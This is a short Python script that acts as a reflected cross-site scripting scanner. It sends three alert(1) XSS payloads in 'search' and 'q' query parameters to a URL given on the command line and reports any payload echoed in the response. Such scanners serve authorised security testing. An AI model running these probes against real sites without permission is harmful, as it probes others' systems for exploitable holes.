import requests
import sys

payloads = ['<script>alert(1)</script>', '\" onclick=\"alert(1)', '<img src=x onerror=alert(1)>']

for p in payloads:
    r = requests.get(sys.argv[1], params={'search': p, 'q': p})
    if p in r.text:
        print(f'[VULN] XSS found: {p}')
